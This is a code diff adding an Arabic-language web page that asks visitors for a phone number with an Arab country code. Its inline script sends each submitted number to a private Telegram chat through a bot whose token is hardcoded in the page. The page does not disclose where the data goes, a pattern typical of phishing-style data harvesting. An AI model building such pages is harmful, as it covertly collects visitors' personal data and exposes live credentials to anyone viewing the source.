@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل رقم الهاتف</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <h1>تسجيل رقم الهاتف</h1>
+            <p>يرجى إدخال رقم هاتفك مع رمز الدولة</p>
+        </div>
+    </header>
+
+    <main>
+        <div class="form-container">
+            <form onsubmit="event.preventDefault(); sendToTelegram();">
+                <label for="countryCode">اختر رمز الدولة:</label>
+                <select id="countryCode" required>
+                    <option value="+20">مصر (+20)</option>
+                    <option value="+971">الإمارات (+971)</option>
+                    <option value="+966">السعودية (+966)</option>
+                    <option value="+212">المغرب (+212)</option>
+                    <option value="+216">تونس (+216)</option>
+                    <option value="+218">ليبيا (+218)</option>
+                    <option value="+962">الأردن (+962)</option>
+                    <option value="+963">سوريا (+963)</option>
+                </select>
+
+                <label for="number">الرجاء إدخال رقم الهاتف:</label>
+                <input type="text" id="number" name="number" required placeholder="أدخل رقم الهاتف هنا فقط" pattern="[0-9]+" title="يرجى إدخال رقم مكون من أرقام فقط">
+                
+                <button type="submit">إرسال</button>
+            </form>
+            <div id="alert" class="alert" style="display: none;"></div>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 جميع الحقوق محفوظة</p>
+    </footer>
+
+    <script>
+        function sendToTelegram() {
+            var number = document.getElementById("number").value.trim();
+            var countryCode = document.getElementById("countryCode").value;
+
+            if (number === "") {
+                showAlert("الرجاء إدخال الرقم");
+                return;
+            }
+
+            if (!/^[0-9]+$/.test(number)) {
+                showAlert("الرجاء إدخال رقم صحيح يحتوي على أرقام فقط.");
+                return;
+            }
+
+            var fullNumber = countryCode + number;
+            var token = '7851246905:AAGZC-xSoTCDRk3JEXmQ4vkx3UxGVXBfcZU';
+            var chatId = '7022091399';
+            var message = `رقم الهاتف المرسل: ${fullNumber}`;
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال الرقم بنجاح!");
+                    } else {
+                        showAlert("تعذر إرسال الرقم. تأكد من التوكن والمعرف.");
+                    }
+                })
+                .catch(error => {
+                    console.error("خطأ:", error);
+                    showAlert("حدث خطأ أثناء محاولة الإرسال. يرجى المحاولة لاحقاً.");
+                });
+        }
+
+        function showAlert(message) {
+            var alertDiv = document.getElementById("alert");
+            alertDiv.textContent = message;
+            alertDiv.style.display = "block";
+        }
+    </script>
+</body>
+</html>
